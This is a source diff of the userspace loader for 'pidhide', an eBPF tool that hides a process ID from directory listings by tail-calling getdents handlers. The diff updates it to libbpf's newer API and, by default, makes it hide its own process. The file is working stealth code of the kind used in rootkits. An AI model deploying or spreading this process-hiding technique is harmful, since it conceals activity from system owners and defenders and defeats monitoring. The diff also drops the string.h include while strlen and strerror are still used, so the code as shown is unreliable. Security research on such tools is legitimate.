@@ -1,12 +1,15 @@
-// SPDX-License-Identifier: BSD-3-Clause
+// SPDX-License-Identifier: (LGPL-2.1 OR BSD-2-Clause)
+/* Copyright (c) 2024 Crowdstrike */
 #include <argp.h>
-#include <unistd.h>
-#include <string.h>
+#include <signal.h>
 #include <stdio.h>
-#include <stdlib.h>
-#include "pidhide.skel.h"
-#include "common_um.h"
+#include <time.h>
+#include <unistd.h>
+#include <sys/resource.h>
+#include <bpf/libbpf.h>
 #include "common.h"
+#include "common_um.h"
+#include "pidhide.skel.h"
 
 // Setup Argument stuff
 static struct env {
@@ -14,7 +17,7 @@ static struct env {
     int target_ppid;
 } env;
 
-const char *argp_program_version = "pidhide 1.0";
+const char *argp_program_version = "pidhide 2.0";
 const char *argp_program_bug_address = "<path@tofile.dev>";
 const char argp_program_doc[] =
 "PID Hider\n"
@@ -29,6 +32,7 @@ static const struct argp_option opts[] = {
     { "target-ppid", 't', "TARGET-PPID", 0, "Optional Parent PID, will only affect its children." },
     {},
 };
+
 static error_t parse_arg(int key, char *arg, struct argp_state *state)
 {
     switch (key) {
@@ -62,7 +66,6 @@ static const struct argp argp = {
     .doc = argp_program_doc,
 };
 
-
 static int handle_event(void *ctx, void *data, size_t data_sz)
 {
     const struct event *e = data;
@@ -79,29 +82,25 @@ int main(int argc, char **argv)
     struct pidhide_bpf *skel;
     int err;
 
-    // Parse command line arguments
+    /* Parse command line arguments */
     err = argp_parse(&argp, argc, argv, 0, NULL, NULL);
-    if (err) {
+    if (err)
         return err;
-    }
-    if (env.pid_to_hide == 0) {
-        printf("Pid Requried, see %s --help\n", argv[0]);
-        exit(1);
-    }
 
-    // Do common setup
+    /* Setup common tasks*/
     if (!setup()) {
-        exit(1);
-    }
- 
-    // Open BPF application 
+        fprintf(stderr, "Failed to do common setup\n");
+        return 1;
+    };
+
+    /* Load and verify BPF application */
     skel = pidhide_bpf__open();
     if (!skel) {
-        fprintf(stderr, "Failed to open BPF program: %s\n", strerror(errno));
+        fprintf(stderr, "Failed to open and load BPF skeleton\n");
         return 1;
     }
 
-    // Set the Pid to hide, defaulting to our own PID
+    /* Set the Pid to hide, defaulting to our own PID */
     char pid_to_hide[10];
     if (env.pid_to_hide == 0) {
         env.pid_to_hide = getpid();
@@ -111,20 +110,23 @@ int main(int argc, char **argv)
     skel->rodata->pid_to_hide_len = strlen(pid_to_hide)+1;
     skel->rodata->target_ppid = env.target_ppid;
 
-    // Verify and load program
+
+    /* Load & verify BPF programs */
     err = pidhide_bpf__load(skel);
     if (err) {
         fprintf(stderr, "Failed to load and verify BPF skeleton\n");
         goto cleanup;
     }
 
-    // Setup Maps for tail calls
+    /* Setup Maps for tail calls */
     int index = PROG_01;
     int prog_fd = bpf_program__fd(skel->progs.handle_getdents_exit);
-    int ret = bpf_map_update_elem(
-        bpf_map__fd(skel->maps.map_prog_array),
+    int ret = bpf_map__update_elem(
+        skel->maps.map_prog_array,
         &index,
+        sizeof(index),
         &prog_fd,
+        sizeof(prog_fd),
         BPF_ANY);
     if (ret == -1) {
         printf("Failed to add program to prog array! %s\n", strerror(errno));
@@ -132,31 +134,34 @@ int main(int argc, char **argv)
     }
     index = PROG_02;
     prog_fd = bpf_program__fd(skel->progs.handle_getdents_patch);
-    ret = bpf_map_update_elem(
-        bpf_map__fd(skel->maps.map_prog_array),
+    ret = bpf_map__update_elem(
+        skel->maps.map_prog_array,
         &index,
+        sizeof(index),
         &prog_fd,
+        sizeof(prog_fd),
         BPF_ANY);
     if (ret == -1) {
         printf("Failed to add program to prog array! %s\n", strerror(errno));
         goto cleanup;
     }
 
-    // Attach tracepoint handler 
-    err = pidhide_bpf__attach( skel);
+    /* Attach tracepoints */
+    err = pidhide_bpf__attach(skel);
     if (err) {
-        fprintf(stderr, "Failed to attach BPF program: %s\n", strerror(errno));
+        fprintf(stderr, "Failed to attach BPF skeleton\n");
         goto cleanup;
     }
 
-    // Set up ring buffer
-    rb = ring_buffer__new(bpf_map__fd( skel->maps.rb), handle_event, NULL, NULL);
+    /* Set up ring buffer polling */
+    rb = ring_buffer__new(bpf_map__fd(skel->maps.rb), handle_event, NULL, NULL);
     if (!rb) {
         err = -1;
         fprintf(stderr, "Failed to create ring buffer\n");
         goto cleanup;
     }
 
+    /* Process events */
     printf("Successfully started!\n");
     printf("Hiding PID %d\n", env.pid_to_hide);
     while (!exiting) {
@@ -173,6 +178,9 @@ int main(int argc, char **argv)
     }
 
 cleanup:
-    pidhide_bpf__destroy( skel);
-    return -err;
+    /* Clean up */
+    ring_buffer__free(rb);
+    pidhide_bpf__destroy(skel);
+
+    return err < 0 ? -err : 0;
 }
